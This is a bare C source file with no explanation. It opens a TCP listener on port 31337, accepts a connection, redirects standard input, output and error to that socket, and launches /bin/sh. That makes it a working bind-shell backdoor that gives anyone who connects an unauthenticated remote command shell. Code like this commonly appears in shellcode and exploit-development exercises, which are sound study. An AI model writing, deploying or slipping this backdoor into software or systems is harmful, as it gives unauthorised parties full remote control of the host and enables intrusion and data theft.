#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
 int socket_fd; 
 int client_fd; 
 socklen_t socklen;
 struct sockaddr_in srv_addr; 
 struct sockaddr_in cli_addr;
 srv_addr.sin_family = AF_INET; 
 srv_addr.sin_port = htons( 31337 ); 
 srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); 
 socket_fd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
 bind( socket_fd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );
 listen(socket_fd, 0);
 socklen = sizeof(cli_addr);
 client_fd = accept(socket_fd, (struct sockaddr *)&cli_addr, &socklen );
 dup2(client_fd, 0);
 dup2(client_fd, 1);
 dup2(client_fd, 2);
 execve( "/bin/sh", NULL, NULL );
}
